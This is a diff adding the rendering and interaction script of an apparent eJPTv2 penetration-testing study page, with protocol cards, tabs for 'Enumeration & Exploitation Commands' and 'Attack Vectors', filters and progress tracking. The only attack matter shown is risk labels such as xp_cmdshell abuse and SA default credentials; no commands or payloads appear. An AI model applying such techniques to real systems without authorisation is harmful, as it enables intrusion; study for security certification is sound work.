+    risks: [{label:'xp_cmdshell',class:'risk-high',val:100},{label:'SA Default Creds',class:'risk-high',val:90},{label:'Linked Servers',class:'risk-high',val:85}]
+  },
+];
+
+// ──────────────────────────────────────────────
+// RENDER FUNCTIONS
+// ──────────────────────────────────────────────
+
+function getTransportBadge(t) {
+  if (t === 'tcp') return '<span class="badge badge-tcp">TCP</span>';
+  if (t === 'udp') return '<span class="badge badge-udp">UDP</span>';
+  return '<span class="badge badge-both">TCP+UDP</span>';
+}
+function getRiskBadge(r) {
+  if (r === 'high') return '<span class="badge badge-risk-high">HIGH RISK</span>';
+  if (r === 'med') return '<span class="badge badge-risk-med">MED RISK</span>';
+  return '<span class="badge badge-risk-low">LOW RISK</span>';
+}
+function getLayerBadge(l) {
+  const map = {l3:'Layer 3',l4:'Layer 4',l7:'Layer 7'};
+  return `<span class="badge badge-layer">${map[l]||l}</span>`;
+}
+
+function renderPacketFields(fields) {
+  return `<div class="packet-diagram">${fields.map(f=>`
+    <div class="pkt-field ${f.key?'key':''}">
+      <div class="pkt-field-name">${f.name}</div>
+      <div class="pkt-field-val">${f.val}</div>
+    </div>`).join('')}</div>`;
+}
+
+function renderCommands(cmds) {
+  return cmds.map((c,i)=>`
+    <div class="code-label">${c.label}</div>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>${c.code}</pre>
+    </div>`).join('');
+}
+
+function renderAttacks(attacks) {
+  return `<table class="attack-table">
+    <thead><tr><th>Attack</th><th>Description</th><th>Impact</th><th>Tools</th></tr></thead>
+    <tbody>${attacks.map(a=>`
+      <tr>
+        <td><span class="attack-name">${a.name}</span></td>
+        <td>${a.desc}</td>
+        <td><span class="badge ${a.impact==='Critical'?'badge-risk-high':a.impact==='High'?'badge-risk-high':'badge-risk-med'}">${a.impact}</span></td>
+        <td>${a.tools.map(t=>`<span class="tool-chip">${t}</span>`).join('')}</td>
+      </tr>`).join('')}
+    </tbody></table>`;
+}
+
+function renderRisks(risks) {
+  return risks.map(r=>`
+    <div class="risk-bar ${r.class}">
+      <span class="risk-label">${r.label}</span>
+      <div class="risk-track"><div class="risk-fill" style="width:${r.val}%"></div></div>
+      <span class="risk-val">${r.val}%</span>
+    </div>`).join('');
+}
+
+function renderCard(p) {
+  const flowSteps = p.howItWorks.map((s,i)=>`
+    <span class="flow-step ${i===0||i===p.howItWorks.length-1?'highlight':''}">${i+1}. ${s}</span>
+    ${i<p.howItWorks.length-1?'<span class="flow-arrow">→</span>':''}`).join('');
+
+  return `
+  <div class="protocol-card" id="${p.id}" data-transport="${p.transport}" data-layer="${p.layer}" data-risk="${p.risk}" data-categories="${p.categories.join(',')}" data-name="${p.name.toLowerCase()}">
+    <div class="pc-header" onclick="toggleCard('${p.id}')">
+      <span class="pc-num">${p.num}</span>
+      <div class="pc-icon" style="background:${p.iconBg}">${p.icon}</div>
+      <div class="pc-meta">
+        <div class="pc-title-row">
+          <span class="pc-name">${p.name}</span>
+          <span class="pc-fullname">${p.full}</span>
+        </div>
+        <div class="pc-badges">
+          <span class="badge badge-port">:${p.port}</span>
+          ${getTransportBadge(p.transport)}
+          ${getLayerBadge(p.layer)}
+          ${getRiskBadge(p.risk)}
+        </div>
+      </div>
+      <span class="pc-expand">▼</span>
+    </div>
+    <div class="pc-body">
+      <div class="pc-tabs">
+        <button class="tab-btn active" onclick="switchTab(event,'${p.id}','overview')">Overview</button>
+        <button class="tab-btn" onclick="switchTab(event,'${p.id}','working')">How It Works</button>
+        <button class="tab-btn" onclick="switchTab(event,'${p.id}','commands')">Commands</button>
+        <button class="tab-btn" onclick="switchTab(event,'${p.id}','attacks')">Attack Vectors</button>
+        <button class="tab-btn" onclick="switchTab(event,'${p.id}','exam')">Exam + Field Tips</button>
+      </div>
+
+      <!-- OVERVIEW TAB -->
+      <div class="tab-panel active" id="${p.id}-tab-overview">
+        <div class="overview-grid">
+          <div class="info-block full">
+            <h4>What is ${p.name}?</h4>
+            <p>${p.structure}</p>
+          </div>
+          <div class="info-block">
+            <h4>Port & Transport</h4>
+            <p>${p.port} — ${p.transport === 'tcp' ? 'TCP (reliable, connection-based)' : p.transport === 'udp' ? 'UDP (fast, connectionless)' : 'Both TCP and UDP'}</p>
+          </div>
+          <div class="info-block">
+            <h4>Risk Profile</h4>
+            ${renderRisks(p.risks)}
+          </div>
+        </div>
+        <div class="panel-heading">Packet / Frame Structure</div>
+        ${renderPacketFields(p.packetFields)}
+        ${p.recordTypes ? `<div class="panel-heading">Record / Data Types</div><ul class="detail-list">${p.recordTypes.map(r=>`<li>${r}</li>`).join('')}</ul>` : ''}
+      </div>
+
+      <!-- HOW IT WORKS TAB -->
+      <div class="tab-panel" id="${p.id}-tab-working">
+        <div class="panel-heading">Communication Flow</div>
+        <div class="flow-diagram">${flowSteps}</div>
+        <div class="panel-heading">Step-by-step breakdown</div>
+        <ul class="detail-list">${p.howItWorks.map((s,i)=>`<li><strong>Step ${i+1}:</strong> ${s}</li>`).join('')}</ul>
+      </div>
+
+      <!-- COMMANDS TAB -->
+      <div class="tab-panel" id="${p.id}-tab-commands">
+        <div class="panel-heading">Enumeration & Exploitation Commands</div>
+        ${renderCommands(p.commands)}
+      </div>
+
+      <!-- ATTACKS TAB -->
+      <div class="tab-panel" id="${p.id}-tab-attacks">
+        <div class="panel-heading">Attack Surface & Techniques</div>
+        ${renderAttacks(p.attacks)}
+      </div>
+
+      <!-- EXAM TAB -->
+      <div class="tab-panel" id="${p.id}-tab-exam">
+        <div class="panel-heading">eJPTv2 Exam Tip</div>
+        <div class="exam-tip"><strong>⚡ EXAM TIP</strong>${p.examTip}</div>
+        <div class="panel-heading">Real-World Field Tip</div>
+        <div class="field-tip"><strong>🏢 FIELD TIP</strong>${p.fieldTip}</div>
+        <div class="panel-heading">Quick Risk Indicators</div>
+        ${renderRisks(p.risks)}
+      </div>
+    </div>
+  </div>`;
+}
+
+// ──────────────────────────────────────────────
+// INIT
+// ──────────────────────────────────────────────
+function init() {
+  const list = document.getElementById('protocolList');
+  list.innerHTML = protocols.map(renderCard).join('');
+
+  // TOC
+  const toc = document.getElementById('tocGrid');
+  toc.innerHTML = protocols.map(p=>`
+    <div class="toc-item" onclick="scrollTo('${p.id}')">
+      <span class="toc-n">${p.num}</span>
+      <span class="toc-name">${p.name}</span>
+      <span class="toc-port">${p.port.split(',')[0].trim()}</span>
+    </div>`).join('');
+}
+
+// ──────────────────────────────────────────────
+// INTERACTIONS
+// ──────────────────────────────────────────────
+function toggleCard(id) {
+  const card = document.getElementById(id);
+  card.classList.toggle('expanded');
+  if (card.classList.contains('expanded')) {
+    markStudied(id);
+  }
+}
+
+function switchTab(e, cardId, tabName) {
+  e.stopPropagation();
+  const card = document.getElementById(cardId);
+  card.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  card.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  e.target.classList.add('active');
+  document.getElementById(`${cardId}-tab-${tabName}`).classList.add('active');
+}
+
+function scrollTo(id) {
+  const el = document.getElementById(id);
+  if (el) { el.scrollIntoView({behavior:'smooth', block:'start'}); if (!el.classList.contains('expanded')) toggleCard(id); }
+  document.querySelectorAll('.sidebar-item').forEach(s => s.classList.remove('active'));
+  const si = document.querySelector(`.sidebar-item[onclick*="${id}"]`);
+  if (si) si.classList.add('active');
+}
+
+function setFilter(f, btn) {
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.querySelectorAll('.protocol-card').forEach(card => {
+    if (f === 'all') { card.classList.remove('hidden'); return; }
+    const cats = card.dataset.categories || '';
+    const layer = card.dataset.layer;
+    const transport = card.dataset.transport;
+    const risk = card.dataset.risk;
+    let show = false;
+    if (f === 'tcp' && (transport === 'tcp' || transport === 'both')) show = true;
+    if (f === 'udp' && (transport === 'udp' || transport === 'both')) show = true;
+    if (f === 'l3' && layer === 'l3') show = true;
+    if (f === 'l4' && layer === 'l4') show = true;
+    if (f === 'l7' && layer === 'l7') show = true;
+    if (f === 'high' && risk === 'high') show = true;
+    if (f === 'remote' && cats.includes('remote')) show = true;
+    if (f === 'file' && cats.includes('file')) show = true;
+    if (f === 'email' && cats.includes('email')) show = true;
+    if (f === 'infra' && cats.includes('infra')) show = true;
+    card.classList.toggle('hidden', !show);
+  });
+  checkNoResults();
+}
+
+function filterProtocols() {
+  const q = document.getElementById('searchInput').value.toLowerCase().trim();
+  document.querySelectorAll('.protocol-card').forEach(card => {
+    const name = card.dataset.name || '';
+    const text = card.innerText.toLowerCase();
+    card.classList.toggle('hidden', q.length > 0 && !text.includes(q) && !name.includes(q));
+  });
+  checkNoResults();
+}
+
+function checkNoResults() {
+  const visible = document.querySelectorAll('.protocol-card:not(.hidden)').length;
+  document.getElementById('noResults').classList.toggle('show', visible === 0);
+}
+
+function copyCode(btn) {
+  const pre = btn.nextElementSibling;
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(()=>{
+    btn.textContent = 'COPIED!';
+    setTimeout(() => btn.textContent = 'COPY', 1500);
+  });
+}
+
+// Progress tracking
+function markStudied(id) {
+  let studied = JSON.parse(localStorage.getItem('proto_studied') || '[]');
+  if (!studied.includes(id)) {
+    studied.push(id);
+    localStorage.setItem('proto_studied', JSON.stringify(studied));
+    updateProgress(studied);
+  }
+}
+function updateProgress(studied) {
+  const n = studied.length;
+  const pct = Math.round((n / 18) * 100);
+  document.getElementById('pbFill').style.width = pct + '%';
+  document.getElementById('pbText').textContent = `${n} / 18 protocols studied`;
+  document.getElementById('pbPct').textContent = pct;
+}
+function loadProgress() {
+  const studied = JSON.parse(localStorage.getItem('proto_studied') || '[]');
+  updateProgress(studied);
+}
+
+// Init
+init();
+loadProgress();
+</script>
+</body>
+</html>
